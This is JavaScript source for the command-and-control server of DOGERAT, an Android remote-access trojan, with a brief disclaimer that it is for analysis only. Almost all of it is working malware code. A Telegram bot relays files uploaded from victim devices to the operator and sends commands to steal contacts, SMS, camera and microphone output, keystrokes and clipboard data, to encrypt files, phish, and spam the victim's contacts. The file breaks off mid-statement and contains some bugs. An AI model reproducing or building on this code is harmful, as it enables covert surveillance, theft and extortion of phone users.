// ⚠️ WARNING: This is DOGERAT Android malware - for security analysis only
// Using this code maliciously is illegal and punishable by law

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

// Initialize Express and Socket.IO
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Load configuration from data.json
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// Initialize Telegram Bot
const bot = new TelegramBot(config.token, {
    polling: true,
    request: {}
});

// Store application state
const appState = new Map();

// Available malicious actions
const availableActions = [
    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
    '✯ 𝚂𝙼𝚂 ✯',
    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
    '✯ 𝙰𝚙𝚙𝚜 ✯',
    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
    '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
    '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
    '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
    '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
    '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯',
    '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝚂𝙼𝚂 ✯',
    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
    '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯',
    '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'
];

// ==================== HTTP ENDPOINTS ====================

// File upload endpoint - receives files stolen from victim devices
app.post('/upload', uploader.single('file'), (req, res) => {
    const originalFilename = req.headers.originalname;
    const victimDeviceId = req.headers.model;

    // Forward stolen file to attacker via Telegram
    bot.sendDocument(
        config.id,
        req.file.buffer,
        {
            caption: `<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${victimDeviceId}</b>`,
            parse_mode: 'HTML'
        },
        {
            filename: originalFilename,
            contentType: '*/*'
        }
    );

    res.send('Done');
});

// Text retrieval endpoint
app.get('/text', (req, res) => {
    res.send(config.text);
});

// ==================== SOCKET.IO - DEVICE CONNECTIONS ====================

io.on('connection', (socket) => {
    // Extract device information from connection
    let deviceIdentifier = socket.handshake.headers.model + '-' + io.sockets.sockets.size || 'no information';
    let deviceVersion = socket.handshake.headers.version || 'no information';
    let deviceIp = socket.handshake.headers.ip || 'no information';

    // Store device info on socket
    socket.model = deviceIdentifier;
    socket.version = deviceVersion;

    // Notify attacker of new victim connection
    let newDeviceMessage =
        '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
        '<b>𝙳𝚎𝚟𝚒𝚌𝚎 </b> → ' + deviceIdentifier + '\n' +
        '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + deviceVersion + '\n' +
        '<b>𝚒𝚙</b> → ' + deviceIp + '\n' +
        '<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n';

    bot.sendMessage(config.id, newDeviceMessage, { parse_mode: 'HTML' });

    // Handle device disconnection
    socket.on('disconnect', () => {
        let disconnectMessage =
            '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
            '<b>𝙳𝚎𝚟𝚒𝚌𝚎 </b> → ' + deviceIdentifier + '\n' +
            '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + deviceVersion + '\n' +
            '<b>𝚒𝚙</b> → ' + deviceIp + '\n' +
            '<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.duration + '\n\n';

        bot.sendMessage(config.id, disconnectMessage, { parse_mode: 'HTML' });
    });

    // Receive messages/data from infected device
    socket.on('text', (message) => {
        bot.sendMessage(
            config.id,
            '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + deviceIdentifier + '\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + message,
            { parse_mode: 'HTML' }
        );
    });
});

// ==================== TELEGRAM BOT COMMAND HANDLER ====================

bot.on('message', (msg) => {

    // START COMMAND - Show welcome menu
    if (msg.text === '/start') {
        bot.sendMessage(
            config.id,
            '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n' +
            'DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n' +
            '𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n' +
            '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // TOAST TEXT INPUT - Step 1 of showing toast notification
    else if (appState.get('currentAction') === 'toast') {
        let toastMessage = msg.text;
        let targetDevice = appState.get('currentTarget');

        // Send toast command to device(s)
        if (targetDevice == 'all') {
            io.sockets.emit('commend', {
                request: 'toast',
                extras: [{ key: 'toastText', value: toastMessage }]
            });
        } else {
            io.to(targetDevice).emit('commend', {
                request: 'toast',
                extras: [{ key: 'toastText', value: toastMessage }]
            });
        }

        appState.delete('currentTarget');
        appState.delete('currentAction');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // URL INPUT - For opening URLs on victim device
    else if (appState.get('currentAction') === 'url') {
        let urlToOpen = msg.text;
        let targetDevice = appState.get('currentTarget');

        if (targetDevice == 'all') {
            io.sockets.emit('commend', {
                request: 'url',
                extras: [{ key: 'text', value: urlToOpen }]
            });
        } else {
            io.to(targetDevice).emit('commend', {
                request: 'url',
                extras: [{ key: 'text', value: urlToOpen }]
            });
        }

        appState.delete('currentTarget');
        appState.delete('currentAction');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // SMS PHONE NUMBER INPUT - Step 1 of sending SMS
    else if (appState.get('currentAction') === 'sendSms') {
        let phoneNumber = msg.text;
        appState.set('smsNumber', phoneNumber);
        appState.set('currentAction', 'smsText');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝙽𝚘𝚬 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ' + phoneNumber + '</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            }
        );
    }

    // SMS TEXT INPUT - Step 2 of sending SMS
    else if (appState.get('currentAction') === 'smsText') {
        let smsMessage = msg.text;
        let phoneNumber = appState.get('smsNumber');
        let targetDevice = appState.get('currentTarget');

        if (targetDevice == 'all') {
            io.sockets.emit('commend', {
                request: 'sendSms',
                extras: [
                    { key: 'number', value: phoneNumber },
                    { key: 'text', value: smsMessage }
                ]
            });
        } else {
            io.to(targetDevice).emit('commend', {
                request: 'sendSms',
                extras: [
                    { key: 'number', value: phoneNumber },
                    { key: 'text', value: smsMessage }
                ]
            });
        }

        appState.delete('currentTarget');
        appState.delete('currentAction');
        appState.delete('smsNumber');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // SMS TO ALL CONTACTS - Mass SMS spam
    else if (appState.get('currentAction') === 'textToAllContacts') {
        let massMessage = msg.text;
        let targetDevice = appState.get('currentTarget');

        if (targetDevice == 'all') {
            io.sockets.emit('commend', {
                request: 'textToAllContacts',
                extras: [{ key: 'toastText', value: massMessage }]
            });
        } else {
            io.to(targetDevice).emit('commend', {
                request: 'textToAllContacts',
                extras: [{ key: 'toastText', value: massMessage }]
            });
        }

        appState.delete('currentTarget');
        appState.delete('currentAction');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // VIBRATE DURATION INPUT
    else if (appState.get('currentAction') === 'vibrate') {
        let vibrateDuration = msg.text;
        let targetDevice = appState.get('currentTarget');

        if (targetDevice == 'all') {
            io.sockets.emit('commend', {
                request: 'vibrate',
                extras: [{ key: 'text', value: vibrateDuration }]
            });
        } else {
            io.to(targetDevice).emit('commend', {
                request: 'time',
                extras: [{ key: 'text', value: vibrateDuration }]
            });
        }

        appState.delete('currentTarget');
        appState.delete('currentAction');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // NOTIFICATION TEXT INPUT - For phishing notifications
    else if (appState.get('currentAction') === 'popNotification') {
        let notificationText = msg.text;
        appState.set('currentNotificationText', notificationText);

        if (target == 'all') {
            io.sockets.emit('commend', {
                request: 'popNotification',
                extras: [{ key: 'text', value: notificationText }]
            });
        } else {
            io.to(target).emit('commend', {
                request: 'popNotification',
                extras: [
                    { key: 'text', value: notificationText },
                    { key: 'notificationText', value: url }
                ]
            });
        }

        appState.delete('currentTarget');
        appState.delete('currentAction');
        appState.delete('currentNotificationText');

        bot.sendMessage(
            config.id,
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // SHOW DEVICES LIST
    else if (msg.text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n',
                { parse_mode: 'HTML' }
            );
        } else {
            let deviceListMessage = '<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ' + io.sockets.sockets.size + '</b>\n\n';
            let deviceNumber = 1;

            io.sockets.sockets.forEach((socket, socketId, map) => {
                deviceListMessage += '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + deviceNumber + '</b>\n' +
                    '<b>𝙳𝚎𝚟𝚒𝚌𝚎 </b> → ' + socket.model + '\n' +
                    '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + socket.version + '\n' +
                    '<b>𝚒𝚙</b> → ' + socket.ip + '\n' +
                    '<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n';
                deviceNumber += 1;
            });

            bot.sendMessage(config.id, deviceListMessage, { parse_mode: 'HTML' });
        }
    }

    // SELECT ACTION FOR ALL DEVICES
    else if (msg.text === '✯ 𝙰𝚕𝚕 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n',
                { parse_mode: 'HTML' }
            );
        } else {
            let deviceButtons = [];

            io.sockets.sockets.forEach((socket, socketId, map) => {
                deviceButtons.push([socket.model]);
            });

            deviceButtons.push(['✯ 𝙰𝚕𝚕 ✯']);
            deviceButtons.push(['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']);

            bot.sendMessage(
                config.id,
                '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: deviceButtons,
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }
    }

    // ABOUT US
    else if (msg.text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
        bot.sendMessage(
            config.id,
            '<b>✯ If you want to hire us for any paid work please contact @sphanter\n' +
            '𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n' +
            '𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\n' +
            'ADMIN → @SPHANTER</b>\n\n',
            { parse_mode: 'HTML' }
        );
    }

    // CANCEL ACTION
    else if (msg.text === '✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯') {
        bot.sendMessage(
            config.id,
            '<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    // DEVICE SELECTED - Show action menu
    else if (msg.text === '✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯') {
        let selectedDeviceId = io.sockets.sockets.get(appState.get('currentTarget')).model;

        if (selectedDeviceId == 'all') {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
                            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
                            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                            ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯'],
                            ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
                            ['✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
                            ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                            ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯'],
                            ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                            ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
                            ['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        } else {
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ' + selectedDeviceId + '</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
                            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
                            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                            ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯'],
                            ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
                            ['✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
                            ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                            ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯'],
                            ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                            ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
                            ['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }
    }

    // HANDLE ACTION BUTTONS
    else if (availableActions.includes(msg.text)) {
        let currentTarget = appState.get('currentTarget');

        // CONTACTS - Steal all contacts
        if (msg.text === '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
            if (currentTarget == 'all') {
                io.sockets.emit('commend', {
                    request: 'contacts',
                    extras: []
                });
            } else {
                io.to(currentTarget).emit('commend', {
                    request: 'contacts',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
                '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                            ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        // SMS - Steal all SMS messages
        else if (msg.text === '✯ 𝚂𝙼𝚂 ✯') {
            if (currentTarget == 'all') {
                io.to(currentTarget).emit('commend', {
                    request: 'sms',
                    extras: []
                });
            } else {
                io.sockets.emit('commend', {
                    request: 'sms',
                    extras: []
                });
            }
            appState.delete('currentTarget');
            bot.sendMessage(
                config.id,
